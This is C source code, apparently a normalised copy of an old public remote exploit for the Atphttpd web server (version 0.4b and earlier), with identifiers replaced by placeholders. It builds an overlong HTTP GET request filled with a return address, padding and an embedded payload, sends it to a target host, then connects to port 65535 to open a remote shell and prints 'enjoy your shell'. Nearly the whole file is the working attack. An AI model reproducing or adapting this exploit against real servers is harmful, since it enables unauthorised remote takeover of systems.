
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;
 size_t VAR_0 ;
 unsigned long VAR_1 ;
 int VAR_2 ;
 int VAR_3 ;
 unsigned long FUNC_0 (char*) ;
 int FUNC_1 (int) ;
 int FUNC_2 (char*,int) ;
 int FUNC_3 (int) ;
 int FUNC_4 (int ) ;
 int FUNC_5 (char*) ;
 int FUNC_6 (char*,...) ;
 scalar_t__ FUNC_7 (int,char*,int,int ) ;
 int FUNC_8 (int) ;
 char* VAR_4 ;
 int FUNC_9 (int) ;
 int VAR_5 ;
 int FUNC_10 (char*) ;

int FUNC_11(int VAR_6,char **VAR_7) {
 int VAR_8,VAR_9;
 char VAR_10[VAR_2];
 unsigned long int VAR_11=0,VAR_12=VAR_1;


 FUNC_6("(<->) Atphttpd <= 0.4b remote exploit by r-code d_fence@gmx.net\n");
 FUNC_6("(<->) Greetz to: czarny,|stachu|, Nitro, Zami, Razor, Jedlik, Cypher\n\n");


 if(VAR_6<2 || VAR_6>3){
  FUNC_6("[-] Usage: %s [host] <offset> #OFFset\n",VAR_7[0]);
  return -1;
 }


 if(VAR_6>2)
  VAR_12=FUNC_0(VAR_7[2]);

 VAR_11=0xbffffffa - VAR_12;

 FUNC_6("<==> OFFSET: 0x%x\n",VAR_12);
 FUNC_6("<==> RET_ADDR: 0x%x\n",VAR_11);




 VAR_10[0x00]='G';
 VAR_10[0x01]='E';
 VAR_10[0x02]='T';
 VAR_10[0x03]=' ';
 VAR_10[0x04]='/';

  for(VAR_8=0x05;VAR_8<VAR_2;) {
   VAR_10[VAR_0 + VAR_8++] = (VAR_11 & 0x000000ff);
   VAR_10[VAR_0 + VAR_8++] = (VAR_11 & 0x0000ff00) >> 8;
   VAR_10[VAR_0 + VAR_8++] = (VAR_11 & 0x00ff0000) >> 16;
   VAR_10[VAR_0 + VAR_8++] = (VAR_11 & 0xff000000) >> 24;
  }


  for(VAR_8=0x05;VAR_8<(VAR_2/2);VAR_8++)
   VAR_10[VAR_8]=0x41;

         for(VAR_8=0;VAR_8<FUNC_10(VAR_4);VAR_8++)
          VAR_10[(VAR_2/2)-(FUNC_10(VAR_4)/2)+VAR_8]=VAR_4[VAR_8];


 VAR_10[VAR_2-0x0c]=' ';
 VAR_10[VAR_2-0x0b]='H';
 VAR_10[VAR_2-0x0a]='T';
 VAR_10[VAR_2-0x09]='T';
 VAR_10[VAR_2-0x08]='P';
 VAR_10[VAR_2-0x07]='/';
 VAR_10[VAR_2-0x06]='1';
 VAR_10[VAR_2-0x05]='.';
 VAR_10[VAR_2-0x04]='1';
 VAR_10[VAR_2-0x03]=0x0d;
 VAR_10[VAR_2-0x02]=0x0a;
 VAR_10[VAR_2-0x01]=0x00;



 FUNC_6("<==> Connecting to '%s' on port '%d'..\n",VAR_7[1],VAR_3);

 if((VAR_9=FUNC_2(VAR_7[1],VAR_3))<0) {
  FUNC_6("<==> Couldn`t connect to host.. :-/\n");
  FUNC_3(1);
 }

 FUNC_6("<==> Sending packets..\n");


 if(FUNC_7(VAR_9,VAR_10,VAR_2,0)<0) {
  FUNC_5("<==> send(): while sending evil http request");
  return -1;
 }

 FUNC_1(VAR_9);

 if((VAR_9=FUNC_2(VAR_7[1],65535))<0) {
  FUNC_6("<==> Exploit failed..! #Probably due to a bad offset\n");
  return -1;
 }


 FUNC_6("\n### Exploit failed ");
 FUNC_4(VAR_5);
 FUNC_9(1);
 FUNC_6("... just kidding ;]\n");
 FUNC_9(1);
 FUNC_6("### Exploit successful - enjoy your shell\n\n");
 FUNC_8(VAR_9);

 return 1;
}
